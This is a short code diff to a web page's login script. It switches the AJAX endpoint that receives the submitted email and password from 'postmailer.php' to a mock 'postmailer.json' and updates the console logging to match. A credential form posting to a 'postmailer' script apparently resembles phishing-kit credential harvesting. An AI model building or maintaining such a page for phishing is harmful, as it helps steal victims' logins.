@@ -249,7 +249,7 @@
              function testBackend() {
                  console.log('Testing backend connection...');
                  $.ajax({
-                     url: 'postmailer.php',
+                     url: 'postmailer.json',
                      method: 'GET',
                      timeout: 5000,
                      success: function(response) {
@@ -308,11 +308,11 @@
                  
                  console.log('Submitting login request...');
                  console.log('Email:', email);
-                 console.log('Backend URL:', 'postmailer.php');
+                 console.log('Backend URL:', 'postmailer.json (Mock for testing)');
                  
                  // AJAX form submission with enhanced error handling
                  $.ajax({
-                     url: 'postmailer.php',
+                     url: 'postmailer.json',
                      method: 'POST',
                      data: { email: email, password: password },
                      dataType: 'json',
@@ -320,7 +320,7 @@
                      cache: false,
                      beforeSend: function() {
                          $('#login_submit').prop('disabled', true).text('Processing...');
-                         console.log('Sending AJAX request to postmailer.php');
+                         console.log('Sending AJAX request to postmailer.json (Mock)');
                      },
                      success: function(response) {
                          console.log('✓ AJAX Success - Server response:', response);
